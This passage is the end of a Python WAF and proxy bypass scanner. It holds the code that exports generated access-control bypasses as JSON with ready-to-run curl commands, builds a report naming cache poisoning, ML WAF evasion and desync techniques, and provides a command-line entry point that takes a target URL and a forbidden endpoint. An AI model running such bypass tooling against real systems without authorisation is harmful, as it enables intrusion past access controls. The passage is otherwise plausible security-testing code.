        """Export bypasses to JSON file for curl generation"""
        if not self.chain_map['bypasses']:
            print("\n⚠️ No bypasses to export")
            return None
        
        # Prepare bypass data for JSON export
        export_data = {
            'target_url': self.target_url,
            'scan_timestamp': datetime.now().isoformat(),
            'infrastructure_chain': self.chain_map['layers'],
            'total_discrepancies': len(self.chain_map['discrepancies']),
            'total_bypasses': len(self.chain_map['bypasses']),
            'bypasses': []
        }
        
        for bypass in self.chain_map['bypasses']:
            bypass_entry = {
                'id': f"bypass_{len(export_data['bypasses']) + 1}",
                'type': bypass['type'],
                'target': bypass['target'],
                'description': bypass['description'],
                'validated': bypass.get('validated', False),
                'curl_data': bypass.get('curl_data', {}),
                'payload': str(bypass.get('payload', ''))
            }
            
            # Generate curl command based on bypass type
            curl_command = self.generate_curl_command(bypass_entry)
            bypass_entry['curl_command'] = curl_command
            
            export_data['bypasses'].append(bypass_entry)
        
        # Save to JSON file
        filename = f"bypasses_{self.parsed_url.netloc}_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(export_data, f, indent=2, default=str)
        
        print(f"\n✅ Bypasses exported to: {filename}")
        print(f"   Total bypasses: {len(export_data['bypasses'])}")
        print(f"   Validated: {len([b for b in export_data['bypasses'] if b['validated']])}")
        
        return filename

    def generate_curl_command(self, bypass_entry):
        """Generate curl command for a specific bypass"""
        base_url = self.target_url
        curl_data = bypass_entry.get('curl_data', {})
        
        if not curl_data:
            return f"# No curl data available for {bypass_entry['type']}"
        
        method = curl_data.get('method', 'GET')
        
        if method == 'RAW_SOCKET':
            return f"# {bypass_entry['type']} requires raw socket programming - cannot be implemented with curl"
        
        elif method == 'SEQUENCE':
            commands = curl_data.get('commands', [])
            return '\n'.join([f"# Step {i+1}: {cmd.replace('$URL', base_url)}" 
                            for i, cmd in enumerate(commands)])
        
        elif method == 'PARALLEL':
            commands = curl_data.get('commands', [])
            return '\n'.join([cmd.replace('$URL', base_url) for cmd in commands])
        
        elif method == 'RACE':
            return f"# Race condition attack - requires precise timing\n# Use multiple terminals or scripting"
        
        else:
            # Build standard curl command
            cmd_parts = ['curl']
            
            # Add method
            if method != 'GET':
                cmd_parts.append(f'-X {method}')
            
            # Add headers
            headers = curl_data.get('headers', {})
            for header, value in headers.items():
                if not header.startswith(':'):  # Skip HTTP/2 pseudo-headers
                    cmd_parts.append(f'-H "{header}: {value}"')
            
            # Add data
            if 'data' in curl_data:
                if isinstance(curl_data['data'], str):
                    cmd_parts.append(f'-d "{curl_data["data"]}"')
                elif isinstance(curl_data['data'], dict):
                    cmd_parts.append(f"-d '{json.dumps(curl_data['data'])}'")
            
            # Add path/query
            path = curl_data.get('path', '')
            query = curl_data.get('query', '')
            full_url = f"{base_url}{path}{query}"
            
            cmd_parts.append(f'"{full_url}"')
            
            # Add notes
            if 'note' in curl_data:
                return f"# Note: {curl_data['note']}\n{' '.join(cmd_parts)}"
            
            return ' '.join(cmd_parts)

    def generate_report(self):
        """Generate comprehensive analysis report"""
        
        report = f"""
========================================
APPLICATION STACK TRACEROUTE REPORT
========================================

Target: {self.target_url}
Scan Time: {time.strftime('%Y-%m-%d %H:%M:%S')}

🔍 PROTOCOL SUPPORT:
HTTP/1.1: ✅
HTTP/2: {"✅" if self.protocols['http2'] else "❌"}
HTTP/3: {"✅" if self.protocols['http3'] else "❌"}
WebSocket: {"✅" if self.protocols['websocket'] else "❌"}

🏗️ INFRASTRUCTURE CHAIN:
{' → '.join(self.chain_map['layers']) if self.chain_map['layers'] else 'Unable to map complete chain'}

🔍 DISCOVERED COMPONENTS:
"""
        
        for layer, discoveries in self.chain_map['fingerprints'].items():
            report += f"\n{layer}:\n"
            for discovery_type, details in discoveries.items():
                report += f"  - {discovery_type}: {details}\n"
        
        # Add forbidden endpoint info
        if self.discovered_forbidden_endpoint:
            report += f"\n🚫 FORBIDDEN ENDPOINT: {self.discovered_forbidden_endpoint}\n"
        elif not self.skip_forbidden_tests:
            report += f"\n⚠️ NO FORBIDDEN ENDPOINT FOUND - Some tests were limited\n"
        
        report += f"""
🚨 PARSING DISCREPANCIES FOUND: {len(self.chain_map['discrepancies'])}
"""
        
        # Group discrepancies by type
        discrepancy_types = {}
        for discrepancy in self.chain_map['discrepancies']:
            disc_type = discrepancy['type']
            if disc_type not in discrepancy_types:
                discrepancy_types[disc_type] = []
            discrepancy_types[disc_type].append(discrepancy)
        
        for disc_type, discrepancies in discrepancy_types.items():
            report += f"\n{disc_type} ({len(discrepancies)} found):\n"
            for disc in discrepancies[:3]:  # Show first 3 of each type
                if 'description' in disc:
                    report += f"  - {disc.get('description', 'N/A')}\n"
                if 'subtype' in disc:
                    report += f"    Subtype: {disc['subtype']}\n"
        
        report += f"""
🎯 GENERATED BYPASSES: {len(self.chain_map['bypasses'])}
"""
        
        validated_bypasses = [b for b in self.chain_map['bypasses'] if b.get('validated', False)]
        
        for bypass in self.chain_map['bypasses']:
            status = "✅ VALIDATED" if bypass.get('validated', False) else "❌ FAILED"
            report += f"\n{status} {bypass['type']}\n"
            report += f"   Target: {bypass['target']}\n"
            report += f"   Description: {bypass['description']}\n"
        
        report += f"""
📊 SUMMARY:
- Total Layers Identified: {len(self.chain_map['layers'])}
- Discrepancies Found: {len(self.chain_map['discrepancies'])}
- Generated Bypasses: {len(self.chain_map['bypasses'])}
- Validated Bypasses: {len(validated_bypasses)}

🔬 RESEARCH VALUE:
This analysis provides insights into the complete request processing chain
and identifies potential bypass opportunities based on parsing discrepancies
between different infrastructure layers.

Advanced techniques tested include:
- Parser state machine desynchronization
- Buffer boundary exploitation
- Multi-layer encoding confusion
- Protocol tunneling attacks
- Cache poisoning vectors
- ML WAF evasion methods
- Container orchestration bypasses

========================================
"""
        
        return report

    async def run_full_analysis(self):
        """Run the complete application traceroute analysis"""
        print("🚀 Starting Application Stack Traceroute Analysis")
        print("=" * 60)
        
        # Phase 0: Find forbidden endpoint
        self.find_forbidden_endpoint()

        # Phase 1: Protocol Discovery
        await self.protocol_discovery()
        
        # Phase 2: Infrastructure Fingerprinting
        self.infrastructure_fingerprinting()
        service_map = self.service_discovery.discover_backend_chain(self.target_url)
    
        for service_endpoint in self.service_discovery.discovered_services:
            # Service mesh detection
            mesh_info = self.mesh_detector.detect_mesh(
                self.session.headers,
                self.service_discovery.service_tree[service_endpoint]
            )
            
            if mesh_info['type']:
                self.log_discovery("Service Mesh", mesh_info['type'], json.dumps(mesh_info['metadata']))
            
            # Request tracking
            request_id = str(uuid.uuid4())
            transformation = self.request_tracker.track_request(
                request_id,
                service_endpoint,
                {'headers': self.session.headers}
            )
            
            # Analyze payload mutations if present
            if transformation['payload']:
                mutations = self.payload_analyzer.analyze_mutations(
                    self.chain_map.get('original_payload', {}),
                    transformation['payload']
                )
                if mutations['type']:
                    self.log_discovery("Payload Mutation", 
                                     f"Types: {', '.join(mutations['type'])}",
                                     f"Severity: {mutations['severity']}")
            
            # Stack-specific processing
            stack_type = self._detect_stack_type(service_endpoint)
            if stack_type:
                processed_request = self.stack_handler.handle_request(
                    stack_type,
                    {'headers': self.session.headers}
                )
                if processed_request != {'headers': self.session.headers}:
                    self.log_discovery("Stack Processing",
                                     stack_type,
                                     "Request modified for stack compatibility")
        
        # Phase 3: Parser Discrepancy Testing (Enhanced)
        self.parser_discrepancy_testing()
        
        # Phase 4: Custom Bypass Generation
        self.generate_custom_bypasses()
        
        # Phase 5: Bypass Validation
        self.test_generated_bypasses()
        
        # Export bypasses to JSON
        json_file = self.export_bypasses_json()
        
        print("\n" + "=" * 60)
        print("📊 ANALYSIS COMPLETE")
        print("=" * 60)
        # Generate command formats for discovered bypasses
        for bypass in self.chain_map['bypasses']:
            self.command_generator = CommandGenerator({
                'url': self.target_url,
                'headers': bypass.get('headers', {}),
                'payload': bypass.get('payload', {})
            })
            bypass['curl_command'] = self.command_generator.generate_curl()
            bypass['python_code'] = self.command_generator.generate_python()
        return self.generate_report()


def main():
    import sys
    import argparse
    
    parser = argparse.ArgumentParser(description='Application Stack Traceroute - WAF/Proxy/Backend Chain Analysis')
    parser.add_argument('target', help='Target URL to analyze')
    parser.add_argument('--forbidden-endpoint', help='Known 403/401 endpoint for bypass testing (e.g. https://target.com/admin)')
    parser.add_argument('--skip-forbidden-tests', action='store_true', help='Skip tests requiring forbidden endpoint')
    
    args = parser.parse_args()
    
    print("🔬 APPLICATION STACK TRACEROUTE - ENHANCED VERSION")
    print("🎯 Next-Generation Infrastructure Analysis with Advanced Bypass Techniques")
    print("=" * 70)
    
    async def run_analysis():
        tracer = ApplicationTraceroute(
            args.target,
            forbidden_endpoint=args.forbidden_endpoint,
            skip_forbidden_tests=args.skip_forbidden_tests
        )
        report = await tracer.run_full_analysis()
        
        print(report)
        
        # Save report
        report_filename = f"app_traceroute_{int(time.time())}.txt"
        with open(report_filename, 'w') as f:
            f.write(report)
        print(f"\n📄 Full report saved to: {report_filename}")
        
        return tracer.chain_map
    
    # Run the analysis
    results = asyncio.run(run_analysis())
    
    print(f"\n🎉 Analysis complete!")
    print(f"📊 Results: {len(results['discrepancies'])} discrepancies, {len(results['bypasses'])} bypasses generated")
    print(f"💾 Check the JSON file for bypass payloads ready for curl testing!")


if __name__ == "__main__":
    main()